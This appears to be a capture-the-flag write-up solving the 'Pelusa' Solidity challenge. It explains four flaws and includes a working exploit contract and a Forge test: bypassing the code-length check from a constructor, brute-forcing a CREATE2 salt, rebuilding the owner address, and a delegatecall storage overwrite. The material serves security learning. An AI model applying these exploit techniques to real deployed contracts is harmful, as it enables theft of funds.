************ Personal analysis and explainer ************
The Pelusa contract presents several vulnerabilities, which put together make up a sort of 
obsticle course an attacker must get through to achieve his goal.
The first vulnerability presented is the use of `msg.sender.code.length == 0` to verify wether
`msg.sender` is an EOA: this check doesn't achieve this check, given that a contract's codesize
is set only at the end of it's constructor's execution. This means that an attacker may bypass this
check by invoking the `passTheBall()` function from within his exploit contract, as I have in my
solution.
The second vulnerability is found at line 22, requiring for the sender's address to have a specified
result when interpreted as an integer and it's modulo 100 is calculated. In combination with the 
vulnerability found above, it becomes obvious that an attacker must come up with a way to deploy a 
contract whose address passes this check: I've accomplished this by brute-forcing the salt given to
create2 when determinstically deploying a contract.
A third vulnerability comes from the fact that Pelusa's `owner` field may easily be reconstructed
by an attacker: anyone is able to view who deployed the contract and at which block, thus recovering
the required address to be returned in the `isGoal()` view function. In my solution, I've carried
out all operations within the same block, whilst in a real life scenario, an attacker will have
to look up the preimage of the keccak256 hash, as cited above.
The final vulnerability comes from the delegatecall at line 35, in which execution is handed
to an arbitrary address, that is able to modify the Pelusa contract's state.
In particular, this allows an attacker to achieve his goal of modifying the `goal` state variable
from 1 to 2, by:
1. Creating a state variable in his exploit contract which will be delegatecalled to (note that
the collision happens at slot 1, as `owner` state variable does not occupy a storage slot)
2. Implementing the `handOfGod()` function to overwrite such storage slot and return the necessary
bytes32 to pass the require statement at line 37.


************ Exploit contract: PelusaExploit.sol ************

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Pelusa.sol";

contract PelusaExploit is IGame {
    Pelusa pelusa;
    uint256 slot1;

    address pelusaOwner;

    event Deployed(address);

    constructor(Pelusa _pelusa, address _pelusaDeployer, bytes32 _pelusaBlockHash) {
        emit Deployed(address(this));

        pelusa = _pelusa;
        pelusa.passTheBall();

        pelusaOwner = address(uint160(uint256(keccak256(abi.encodePacked(_pelusaDeployer, _pelusaBlockHash)))));
    }

    function getBallPossesion() external view returns (address) {
        return pelusaOwner;
    }

    function handOfGod() external returns (bytes32) {
        slot1++;
        return(bytes32(uint256(22_06_1986)));
    }

}

************ Forge test contract to verify POC: Pelusa.t.sol ************

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PelusaExploit.sol";

contract PelusaTest is Test {
    Pelusa pel;
    PelusaExploit expl;

    address pelusaDeployer = makeAddr("pelusaDeployer");
    address attacker = makeAddr("attacker");

    function testFindCreate2Salt() external {
        vm.prank(pelusaDeployer);
        pel = new Pelusa();

        vm.startPrank(attacker);
        for (uint256 i; i < 1000; ++i) {
            vm.expectRevert();
            emit log_uint(i);
            expl = new PelusaExploit{
                salt: bytes32(uint256(i))
            }(pel, pelusaDeployer, blockhash(block.number));
        }
    }

    function testExploit() external {
        vm.prank(pelusaDeployer);
        pel = new Pelusa();

        vm.startPrank(attacker);
        /* In a real world scenario, an attacker is able to retrieve the deployer's address and the block.number at which the Pelusa
        contract was deployed, effectively reconstructing the `owner` address and passing the `isGoal()` check.
        */
        expl = new PelusaExploit{
            salt: bytes32(uint256(39)) // salt value 39 was found by brute forcing the create2 address pre computation in the above test
        }(pel, pelusaDeployer, blockhash(block.number));
        pel.shoot();
        vm.stopPrank();

        assertEq(pel.goals(), 2);
    }
}
